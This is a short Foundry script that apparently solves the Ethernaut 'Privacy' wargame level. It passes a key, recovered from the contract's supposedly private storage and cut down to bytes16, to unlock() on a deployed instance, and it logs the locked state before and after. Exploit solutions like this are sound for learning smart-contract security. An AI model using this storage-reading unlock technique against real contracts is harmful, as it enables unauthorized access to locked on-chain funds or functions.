// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Privacy} from "../src/Privacy.sol";
import {Script, console} from "forge-std/script.sol";

contract PrivacySolution is Script {
    function run() public {
        Privacy privacy = Privacy(0x2C9C406b132AA0D2e1F9250620b7b8bE14544fF0);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("The privacy is actually :", privacy.locked());
        privacy.unlock(bytes16(bytes32(0xf7638ad369dee3c605be21c773cb752e0957f03358403c27a3bf5ef5ac3d43fd)));
        console.log("The privacy is actually :", privacy.locked());
        vm.stopBroadcast();
    }
}
